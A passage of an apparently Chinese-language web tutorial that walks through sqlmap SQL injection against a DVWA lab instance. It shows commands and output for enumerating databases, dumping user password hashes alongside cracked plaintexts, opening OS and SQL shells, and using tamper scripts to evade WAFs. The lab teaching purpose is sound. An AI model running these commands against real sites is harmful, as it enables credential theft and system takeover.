+<pre data-role="codeBlock" data-info class="language-"><code>$ sqlmap -u &quot;http://192.168.119.129:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
+--cookie=&quot;PHPSESSID=jh23103cqh5bh33a53gelso9d1; security=low&quot; \
+-p id \
+--dbs
+</code></pre><ol start="3">
+<li>&#x83B7;&#x53D6;&#x8868;&#x4FE1;&#x606F;</li>
+</ol>
+<pre data-role="codeBlock" data-info class="language-"><code>$ sqlmap -u &quot;http://192.168.119.129:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
+--cookie=&quot;PHPSESSID=jh23103cqh5bh33a53gelso9d1; security=low&quot; \
+-p id \
+-D dvwa \
+--tables
+
+---
+[20:54:35] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 8 (jessie)
+web application technology: Apache 2.4.10
+back-end DBMS: MySQL &gt;= 5.0
+[20:54:35] [INFO] fetching tables for database: &apos;dvwa&apos;
+Database: dvwa
+[2 tables]
++-----------+
+| guestbook |
+| users     |
++-----------+
+</code></pre><ol start="5">
+<li>&#x83B7;&#x53D6;&#x5217;&#x4FE1;&#x606F;</li>
+</ol>
+<pre data-role="codeBlock" data-info class="language-"><code>$ sqlmap -u &quot;http://192.168.119.129:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
+--cookie=&quot;PHPSESSID=jh23103cqh5bh33a53gelso9d1; security=low&quot; \
+-p id \
+-D dvwa \
+-T users \
+--columns
+</code></pre><ol start="6">
+<li>&#x83B7;&#x53D6;&#x7C7B;&#x5185;&#x5BB9;</li>
+</ol>
+<pre data-role="codeBlock" data-info class="language-"><code>$ sqlmap -u &quot;http://192.168.119.129:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
+--cookie=&quot;PHPSESSID=jh23103cqh5bh33a53gelso9d1; security=low&quot; \
+-p id \
+-D dvwa \
+-T users \
+-C last_name,password \
+--dump
+
+---
+Database: dvwa
+Table: users
+[5 entries]
++-----------+---------------------------------------------+
+| last_name | password                                    |
++-----------+---------------------------------------------+
+| admin     | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+| Brown     | e99a18c428cb38d5f260853678922e03 (abc123)   |
+| Me        | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
+| Picasso   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
+| Smith     | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
++-----------+---------------------------------------------+
+</code></pre><ol start="7">
+<li>&#x83B7;&#x53D6; os shell</li>
+</ol>
+<pre data-role="codeBlock" data-info class="language-"><code>$ sqlmap -u &quot;http://192.168.119.129:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
+--cookie=&quot;PHPSESSID=jh23103cqh5bh33a53gelso9d1; security=low&quot; \
+-p id \
+--os-shell
+</code></pre><ol start="8">
+<li>&#x83B7;&#x53D6;&#x6570;&#x636E;&#x5E93; shell</li>
+</ol>
+<pre data-role="codeBlock" data-info class="language-"><code>$ sqlmap -u &quot;http://192.168.119.129:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; \
+--cookie=&quot;PHPSESSID=jh23103cqh5bh33a53gelso9d1; security=low&quot; \
+-p id \
+--sql-shell
+</code></pre><p><strong>&#x5176;&#x4ED6;&#x4E00;&#x822C;&#x53C2;&#x6570;</strong></p>
+<pre data-role="codeBlock" data-info class="language-"><code>-hh               &#x83B7;&#x53D6;&#x8BE6;&#x7EC6;&#x5E2E;&#x52A9;
+--batch           &#x9ED8;&#x8BA4;&#x56DE;&#x7B54; yes
+--fresh-queries   &#x4E0D;&#x4F7F;&#x7528; session file &#x4E2D;&#x7684;&#x7F13;&#x5B58;
+--risk            &#x98CE;&#x9669;&#x7B49;&#x7EA7;&#xFF0C;&#x9ED8;&#x8BA4;1&#xFF0C;3&#x4F1A;&#x589E;&#x52A0; OR &#x8BED;&#x53E5;&#x6D4B;&#x8BD5;
+-o                &#x5F00;&#x542F;&#x6240;&#x6709;&#x4F18;&#x5316;
+--tamper          &#x662F;&#x54DF; sqlmap &#x81EA;&#x5E26;&#x7684; tamper &#x6216;&#x81EA;&#x5DF1;&#x5199;&#x7684; tamper&#xFF0C;&#x6765;&#x6DF7;&#x6DC6; Payload&#xFF0C;&#x901A;&#x5E38;&#x7528;&#x6765;&#x7ED5;&#x8FC7; waf &#x548C; ips
+</code></pre>
+      </div>
+      
+      
+    
+    
+    
+    
+    
+    
+    
+    
+  
+    </body></html>
